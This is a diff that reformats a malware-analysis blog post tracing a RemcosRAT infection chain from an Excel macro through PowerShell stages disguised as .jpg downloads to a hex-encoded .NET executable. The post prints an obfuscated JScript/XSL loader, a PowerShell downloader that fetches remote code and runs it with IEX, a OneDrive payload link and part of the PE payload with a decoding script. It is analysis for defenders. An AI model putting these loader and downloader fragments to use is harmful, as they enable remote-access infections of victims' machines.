@@ -1,14 +1,16 @@
 ---
-title: "RemcosRat infection chain from excel with Macros"
+title: 'RemcosRat infection chain from excel with Macros'
 date: '2022-01-25'
-tags: ['Remcos','rat','malware']
+tags: ['Remcos', 'rat', 'malware']
 draft: false
-summary: RemcosRAT is a Fileless multi-stage malware that is distributed through malicious macros in Excel files. The malware enables remote administration of infected systems to perform unintended actions.
-images: []
+summary: RemcosRAT is a Fileless multi-stage malware that is distributed through malicious macros in Excel files.
+images: '/static/images/mal/remcosrat/headmail.jpg'
 layout: PostLayout
 canonicalUrl:
 ---
+
 # What is RemcosRat?
+
 RemcosRAT is a Fileless multi-stage malware that is distributed through malicious macros in Excel files. The malware enables remote administration of infected systems to perform unintended actions. This is a simple guide on understanding RemcosRat infection chain. The RemcosRAT infection can be described as shown in the image by [@Unit 42](https://twitter.com/Unit42_Intel/status/1478744612516900868).
 
 ![Infection Chain](/static/images/mal/remcosrat/chain.jpeg)
@@ -28,17 +30,31 @@ Image above shows a Filter of **http** traffic in wireshark.The malware is tryin
 From the tweet provided by **unit42intel**, the above link of the onedrive downloads a `VBS` file. The vbs file is not available in the onedrive at the time of writting but it is provided in the malware-traffic-analysis website.
 
 ```html
-<html><head><title>Object moved</title></head><body>
-<h2>Object moved to <a href="https://onedrive.live.com/download?cid=64F8294A00286885&amp;resid=64F8294A00286885%21770&amp;authkey=ABI3zrc6BsVUKxU">here</a>.</h2>
-</body></html>
+<html>
+  <head>
+    <title>Object moved</title>
+  </head>
+  <body>
+    <h2>
+      Object moved to
+      <a
+        href="https://onedrive.live.com/download?cid=64F8294A00286885&amp;resid=64F8294A00286885%21770&amp;authkey=ABI3zrc6BsVUKxU"
+        >here</a
+      >.
+    </h2>
+  </body>
+</html>
 ```
+
 Verify the sha256 hash of the `misc.vbs` matches the one provided in IOcs of Remcos Rat.
 
 ```bash
-@remcosrat$ shasum -a 256 misc.vbs 
+@remcosrat$ shasum -a 256 misc.vbs
 95c0a9e6463a2eb1bbfe3198cd4b6cd74927a209ca4ab17501c2f444494f4499  misc.vbs
 ```
+
 ## Stage2 Downloader (atcn.jpg)
+
 Right click the `GET /atcn.jpg` url in wireshark and follow the **http** stream. The HTTP streams of the urls accessed by the malware are as shown below.
 
 ![url wireshark](/static/images/mal/remcosrat/stage1_stream.png)
@@ -50,13 +66,14 @@ From the above, the malware is executing a powershell script. The script seems t
 First check the file format of the files, The downloaded files as are not images as the extensions suuggests to. They are ASCCII text files.
 
 ```bash
-$ file atcn.jpg 
+$ file atcn.jpg
 atcn.jpg: ASCII text, with very long lines (4130), with CRLF line terminators
-$ file calient.jpg 
+$ file calient.jpg
 calient.jpg: ASCII text, with very long lines (65536), with no line terminators
 ```
 
 Below is the obfuscated powershell script.
+
 ```javascript
 <xsl:stylesheet version="1.0"
       xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
@@ -65,7 +82,7 @@ Below is the obfuscated powershell script.
 
  <msxsl:script language="JScript" implements-prefix="user">
 <![CDATA[
-   
+
 
 var r = new ActiveXObject(x0asd44("5368656c6c2e4170706c69636174696f6e"))
 
@@ -82,18 +99,21 @@ function x0asd44(hex) {
 ```
 
 First decode the string we are passing to **ActiveXObject** function.
+
 ```javascript
 function x0asd44(hex) {
-    var str = '';
-    for (var i = 0; i < hex.length; i += 2) str += String.fromCharCode(parseInt(hex.substr(i, 2), 16));
-    return str;
+  var str = ''
+  for (var i = 0; i < hex.length; i += 2) str += String.fromCharCode(parseInt(hex.substr(i, 2), 16))
+  return str
 }
 
-console.log(x0asd44("5368656c6c2e4170706c69636174696f6e"))
+console.log(x0asd44('5368656c6c2e4170706c69636174696f6e'))
 ```
+
 Executing the above javascript code, our hexstring string parameter is decoded to `Shell.Application`.
 
 Below is the deobfuscated powershell script which is passed `shell.Application` as shown in the obsfucated script.
+
 ```powershell
 '[void] [System.Reflection.Assembly]::LoadWithPartialName(''Microsoft.VisualBasic'')'|IEX;
 $t56fg = [Enum]::ToObject([System.Net.SecurityProtocolType], 3072);
@@ -107,19 +127,20 @@ $y5jh62df0= I`E`X($r78fd000sd -join '')
 
 The deobfuscated powershell script above downloads another string at the domain highlighted above. The malware gets obsfuscated strings of the `calient.jpg` url.
 
-
 ## Stage3 Downloader (calient.jpg)
+
 Stage two downloads third obfuscated script strings in calient.jpg url. This string is obfuscated and larger than the second stage `atcn.jpg` string. Looking at the obfuscated strings we have an interesting string referenced by `ftIXfysfU` variable.
+
 ```xml
 $y='[System.AppDomain]'|W0B4J;
 $g55=$y.GetMethod("get_CurrentDomain")
 
  [String]$ftIXfysfU='4D5A90000300000004000000FFFF0000B800000000000000400000000000000000000000000000000000000000000000000000000000000000000000800000000E1FBA0E00B409CD21B8014CCD21546869732070726F6772616D2063616E6E6F742062652072756E20696E20444F53206D6F64652E0D0D0A2400000000000000504500004C010300AF89D1610000000000000000E00002210B010800004402000048
- ```
- The string above seems to be an executable. This is because of the header file of PE executable. The magic number 4D5A or ASCII characters MZ represents the beginning of the file signature of Microsoft PE file.
+```
 
- ![Http filter](/static/images/mal/remcosrat/pehead.png)
+The string above seems to be an executable. This is because of the header file of PE executable. The magic number 4D5A or ASCII characters MZ represents the beginning of the file signature of Microsoft PE file.
 
+![Http filter](/static/images/mal/remcosrat/pehead.png)
 
 Simple python script for decoding the bytes into an executable
 
@@ -134,12 +155,13 @@ with open('open.exe', 'wb') as filepe:
 Now we have a fully RemcosRat malware, which a .NET family malware.
 
 ```bash
-remcosrat$ file open.exe 
+remcosrat$ file open.exe
 open.exe: PE32 executable (DLL) (console) Intel 80386 Mono/.Net assembly, for MS Windows
 ```
 
 Next is analyzing the dropped PE file.
 
 ## References
+
 1. https://www.malware-traffic-analysis.net/2022/01/04/index.html
 2. https://twitter.com/Unit42_Intel/status/1478744612516900868/
